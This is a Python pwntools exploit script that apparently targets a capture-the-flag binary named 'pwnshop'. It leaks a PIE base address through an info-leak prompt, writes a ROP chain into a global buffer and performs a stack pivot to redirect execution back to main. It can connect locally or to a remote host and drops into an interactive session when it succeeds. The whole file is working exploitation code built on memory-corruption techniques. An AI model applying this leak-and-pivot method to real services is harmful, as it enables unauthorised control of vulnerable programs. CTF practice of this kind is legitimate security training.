#!/usr/bin/env python3
from pwn import *
import argparse

context.arch = 'amd64'
context.log_level = 'info'

BINARY = './challenge/pwnshop'

def conn(local=True, host=None, port=None):
    if local:
        return process(BINARY)
    else:
        return remote(host, port)

def exploit(p, elf, libc):
    POP_RSP_R13_R14_R15 = 0x13bd
    SUB_RSP_28_RET      = 0x1219
    RET                 = 0x101a
    MAIN                = 0x10a0
    GLOBAL_BUF          = 0x40c0

    # ---------- Phase 1: Leak PIE ----------
    log.info('Phase 1: PIE leak')
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'sell? ', b'AAAA')
    p.sendafter(b'it? ', b'1' * 8)
    resp = p.recvuntil(b'1> Buy')
    idx = resp.find(b'What? ')
    leak = resp[idx + 6:]
    end = leak.find(b'?')
    leak_str = leak[:end]
    addr_bytes = leak_str[8:14]
    global_buf_addr = u64(addr_bytes.ljust(8, b'\x00'))
    pie_base = global_buf_addr - GLOBAL_BUF
    assert pie_base & 0xfff == 0, f'PIE base not aligned: {hex(pie_base)}'
    log.success(f'PIE base: {hex(pie_base)}')

    # ---------- Phase 2: Write minimal ROP (just return to main) ----------
    log.info('Phase 2: Write test ROP to GLOBAL_BUF')
    rop1  = p64(0) * 3                    # r13,r14,r15
    rop1 += p64(pie_base + RET)           # align stack
    rop1 += p64(pie_base + MAIN)          # return to main

    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'sell? ', b'AAAA')
    p.sendafter(b'it? ', b'13.37\n')
    p.recvuntil(b'take a look.')
    p.send(rop1.ljust(64, b'\x00'))

    # ---------- Phase 3: Stack pivot ----------
    log.info('Phase 3: Stack pivot')
    p.sendlineafter(b'> ', b'1')
    p.recvuntil(b'details: ')

    pivot  = b'C' * 0x28
    pivot += p64(pie_base + POP_RSP_R13_R14_R15)
    pivot += p64(pie_base + GLOBAL_BUF)
    pivot += p64(0) * 2
    pivot += p64(pie_base + SUB_RSP_28_RET)

    log.info(f'Pivot payload ({len(pivot)} bytes)')
    p.send(pivot)

    # ---------- Phase 4: See if main restarts ----------
    log.info('Phase 4: Waiting for menu...')
    try:
        data = p.recvuntil(b'> ', timeout=5)
        log.success(f'PIVOT WORKS! Main restarted. Got: {data[:50]}')
        return True
    except:
        log.error('No response - pivot might have failed')
        # Try to get any data
        try:
            rest = p.recv(timeout=2)
            log.info(f'Got raw: {rest[:50]}')
        except:
            pass
        return False


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--remote', nargs=2, metavar=('HOST', 'PORT'))
    parser.add_argument('--local', action='store_true', default=True)
    args = parser.parse_args()

    elf = ELF(BINARY)
    libc = ELF('/usr/lib/libc.so.6')

    if args.remote:
        p = conn(local=False, host=args.remote[0], port=args.remote[1])
    else:
        p = conn(local=True)

    result = exploit(p, elf, libc)
    if result:
        p.interactive()
    else:
        p.close()


if __name__ == '__main__':
    main()
